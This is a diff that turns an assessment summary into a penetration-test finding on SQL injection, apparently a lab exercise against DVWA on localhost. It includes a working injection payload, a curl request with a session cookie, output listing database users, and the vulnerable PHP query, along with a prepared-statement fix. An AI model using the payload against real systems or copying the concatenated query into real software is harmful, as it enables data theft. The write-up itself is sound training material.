@@ -1,21 +1,114 @@
-# Workstream B: Web Application Security Assessment
+# F01: SQL Injection Vulnerability
 
-## Test Environment
+## OWASP Category: A03 - Injection
 
-- **DVWA**: http://localhost:8085
-- **Juice Shop**: http://localhost:3001
+## Target Application
+- **URL**: http://localhost:8085/vulnerabilities/sqli/
+- **Parameter**: `id` (GET parameter)
+- **Security Level**: Low
 
-## Credentials
+## Proof of Concept
 
-- DVWA Username: `admin`
-- DVWA Password: `password`
+### Normal Request (User ID = 1)
 
-## Findings Summary
+http://localhost:8085/vulnerabilities/sqli/?id=1&Submit=Submit
+text
 
-| ID | Vulnerability | OWASP Category | Status |
-|----|---------------|----------------|--------|
-| F01 | SQL Injection | A03 Injection | Completed |
-| F02 | Stored XSS | A03 Injection | Completed |
-| F03 | IDOR | A01 Broken Access Control | Completed |
-| F04 | Authentication Bypass | A07 Auth Failures | Completed |
-| F05 | Security Misconfiguration | A05 Security Misconfig | Completed |
+**Response**: Shows only user "admin"
+
+### Malicious Request
+
+http://localhost:8085/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit
+text
+
+**Decoded Payload**: `id=1' OR '1'='1`
+
+**Response**: Shows ALL users in the database
+
+## Evidence
+
+### cURL Command
+```bash
+curl -X GET "http://localhost:8085/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit" \
+  -H "Cookie: PHPSESSID=vobjtv2t0uecssj47un24786c3; security=low"
+
+Sample Output
+text
+
+ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+
+ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+
+ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+
+ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
+
+Root Cause Analysis
+
+The PHP code concatenates user input directly into the SQL query:
+php
+
+// Vulnerable code in DVWA
+$id = $_GET['id'];
+$query = "SELECT first_name, last_name FROM users WHERE user_id = $id";
+$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
+
+The application does NOT:
+
+    Sanitize the user input
+
+    Use parameterized queries
+
+    Escape special characters
+
+Business Impact
+
+If this vulnerability existed in Meridian FinServe's customer portal:
+
+    Data Breach: Attacker could extract all customer PII (names, addresses, financial data)
+
+    Account Takeover: Bypass authentication and login as any user
+
+    Regulatory Violations: RBI guidelines require data protection - breach would incur fines
+
+    Reputational Damage: Loss of customer trust, negative media coverage
+
+Remediation
+Code Fix - Before (Vulnerable)
+php
+
+$id = $_GET['id'];
+$query = "SELECT first_name, last_name FROM users WHERE user_id = $id";
+$result = mysqli_query($conn, $query);
+
+Code Fix - After (Secure)
+php
+
+$id = $_GET['id'];
+$query = "SELECT first_name, last_name FROM users WHERE user_id = ?";
+$stmt = $conn->prepare($query);
+$stmt->bind_param("i", $id);
+$stmt->execute();
+$result = $stmt->get_result();
+
+Why This Fix Works
+
+    Prepared statements separate SQL logic from data
+
+    Bind parameters ensure user input is treated as data, not executable code
+
+    Even if an attacker injects SQL, it won't be executed
+
+References
+
+    OWASP SQL Injection
+
+    PHP Prepared Statements
